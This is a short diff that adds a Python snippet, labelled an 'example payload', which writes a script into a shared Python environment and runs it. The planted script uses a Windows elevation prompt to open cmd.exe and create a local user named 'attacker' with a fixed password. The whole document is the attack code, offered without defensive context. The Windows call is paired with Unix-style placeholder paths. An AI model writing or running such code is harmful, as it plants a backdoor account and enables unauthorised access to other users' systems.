@@ -1,0 +1,22 @@
+```python
+import os
+
+# Example payload to create a malicious script in the shared environment
+malicious_script = """
+import os
+import ctypes
+
+# Code to escalate privileges
+def escalate_privileges():
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c net user attacker MySecurePassword /add", None, 1)
+
+escalate_privileges()
+"""
+
+# Write the malicious script to the shared environment
+with open('/path/to/shared/python/environment/malicious_script.py', 'w') as f:
+    f.write(malicious_script)
+
+# Execute the malicious script
+os.system('python /path/to/shared/python/environment/malicious_script.py')
+```
